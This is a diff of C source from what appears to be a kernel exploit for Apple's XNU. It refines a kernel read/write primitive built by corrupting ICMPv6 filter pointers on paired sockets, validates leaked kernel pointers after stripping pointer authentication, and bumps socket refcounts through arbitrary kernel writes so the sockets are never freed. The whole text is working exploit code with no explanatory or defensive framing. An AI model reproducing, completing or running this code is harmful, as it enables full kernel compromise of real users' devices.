@@ -720,9 +720,29 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 		}
 		printf("[+] controlSocket idx=%d fd=%d, rwSocket fd=%d\n", controlSocketIdx, controlSocket, rwSocket);
 		fflush(stdout);
-		// read controlSocketPcb NOW while inp_list is intact (sockets_release will tear it down)
-		controlSocketPcb = __xpaci(early_kread64(rwSocketPcb + OFFSET_PCB_LIST_NEXT));
-		printf("[i] controlSocketPcb=%#llx\n", controlSocketPcb); fflush(stdout);
+
+		memset(controlData, 0, EARLY_KRW_LENGTH);
+		*(uint64_t *)controlData = rwSocketPcb + OFFSET_PCB_LIST_NEXT;
+		if (setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH) != 0) {
+			printf("[-] KRW validation: setsockopt failed, retrying\n"); fflush(stdout);
+			// don't close — corrupted filter would panic on rip6_detach
+			controlSocket = 0; rwSocket = 0;
+			return -1;
+		}
+		uint8_t vbuf[EARLY_KRW_LENGTH];
+		socklen_t vlen = EARLY_KRW_LENGTH;
+		if (getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, vbuf, &vlen) != 0) {
+			printf("[-] KRW validation: getsockopt failed, retrying\n"); fflush(stdout);
+			controlSocket = 0; rwSocket = 0;
+			return -1;
+		}
+		controlSocketPcb = __xpaci(*(uint64_t *)vbuf);
+		if ((controlSocketPcb >> 56) != 0xff) {
+			printf("[-] KRW validation: controlSocketPcb=%#llx not kernel ptr, retrying\n", controlSocketPcb); fflush(stdout);
+			controlSocket = 0; rwSocket = 0;
+			return -1;
+		}
+		printf("[i] controlSocketPcb=%#llx (validated)\n", controlSocketPcb); fflush(stdout);
 		return KERN_SUCCESS;
 	}
 	return -1;
@@ -874,22 +894,7 @@ void krw_sockets_leak_forever(void)
 	early_kwrite64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT, controlSocketSoCount + 0x0000100100001001);
 	early_kwrite64(rwSocketAddr + OFFSET_SOCKET_SO_COUNT, rwSocketSoCount + 0x0000100100001001);
 
-	// verify the bumps took effect
-	uint64_t verify_ctrl = early_kread64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT);
-	uint64_t verify_rw = early_kread64(rwSocketAddr + OFFSET_SOCKET_SO_COUNT);
-	printf("[i] krw: verify ctrl_so_count=%#llx rw_so_count=%#llx\n", verify_ctrl, verify_rw); fflush(stdout);
-
 	early_kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);
-
-	// NULL all icmp6_filter pointers on the target page to prevent zone_require
-	// panics from collateral OOB race damage. The race may write stale data to
-	// neighboring PCBs, corrupting their filter pointers. NULLing makes
-	// rip6_detach skip kfree_type (it checks: if (inp->in6p_icmp6filt)).
-	uint64_t pageBase = rwSocketPcb & ~0x3FFFULL;
-	for (int pi = 0; pi < 16; pi++) {
-		early_kwrite64(pageBase + pi * 0x400 + OFFSET_ICMP6FILT, 0);
-	}
-	printf("[i] NULLed 16 filter pointers on page %#llx\n", pageBase); fflush(stdout);
 }
 
 uint64_t kernel_base;
